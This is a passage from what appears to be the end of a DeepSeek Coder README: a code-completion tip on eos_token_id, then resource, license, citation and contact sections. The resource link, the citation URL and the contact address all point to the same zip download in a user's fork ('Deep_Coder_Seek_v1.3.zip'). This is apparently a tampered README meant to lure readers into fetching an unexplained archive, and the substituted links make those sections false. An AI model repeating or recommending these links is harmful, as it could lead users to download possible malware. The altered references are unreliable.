Although the deepseek-coder-instruct models are not specifically trained for code completion tasks during supervised fine-tuning (SFT), they retain the capability to perform code completion effectively. To enable this functionality, you simply need to adjust the eos_token_id parameter. Set the eos_token_id to 32014, as opposed to its default value of 32021 in the deepseek-coder-instruct configuration. This modification prompts the model to recognize the end of a sequence differently, thereby facilitating code completion tasks.


### 8. Resources
[awesome-deepseek-coder](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip) is a curated list of open-source projects related to DeepSeek Coder.

### 9. License
This code repository is licensed under the MIT License. The use of DeepSeek Coder models is subject to the Model License. DeepSeek Coder supports commercial use.

See the [LICENSE-CODE](LICENSE-CODE) and [LICENSE-MODEL](LICENSE-MODEL) for more details.

### 10. Citation
```
@misc{deepseek-coder,
  author = {Daya Guo, Qihao Zhu, Dejian Yang, Zhenda Xie, Kai Dong, Wentao Zhang, Guanting Chen, Xiao Bi, Y. Wu, Y.K. Li, Fuli Luo, Yingfei Xiong, Wenfeng Liang},
  title = {DeepSeek-Coder: When the Large Language Model Meets Programming -- The Rise of Code Intelligence},
  journal = {CoRR},
  volume = {abs/2401.14196},
  year = {2024},
  url = {https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip},
}
```

### 11. Contact

If you have any questions, please raise an issue or contact us at [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/MBPP/utils/Deep_Coder_Seek_v1.3.zip).
